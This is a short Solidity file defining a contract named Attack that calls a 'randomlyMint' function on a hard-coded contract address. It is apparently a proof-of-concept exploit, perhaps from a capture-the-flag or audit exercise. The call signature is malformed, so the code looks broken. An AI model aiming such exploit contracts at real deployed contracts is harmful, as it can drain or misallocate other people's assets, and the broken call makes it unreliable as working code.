// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    address public bentoUtil;

    constructor() {
        bentoUtil = address(0xBc1Bb37A522EDB1cAa073ac2B3DEbAcd5E89D81d);
    }

    function attack() public {
        (bool success, ) = bentoUtil.call(
            abi.encodeWithSignature("randomlyMint()(address,uint256)", 0)
        );
        require(success, "Attack failed");
    }
}
